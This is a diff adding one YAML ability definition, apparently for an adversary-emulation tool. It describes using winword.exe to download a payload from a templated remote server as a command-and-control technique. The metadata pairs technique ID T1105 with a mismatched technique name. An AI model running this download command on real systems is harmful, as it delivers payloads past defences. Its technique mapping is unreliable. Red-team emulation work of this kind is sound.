@@ -1,0 +1,21 @@
+- id: a7828929-9f10-2bb1-1750-ac61841331ce
+  name: Winword.exe - Downloads payload from remote server
+  description: Downloads payload from remote server
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'winword.exe #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Reegun J (OCBC Bank)
+  created: '2019-07-19'
+  modified: '2019-07-19'
+  operating_system: Windows All Versions
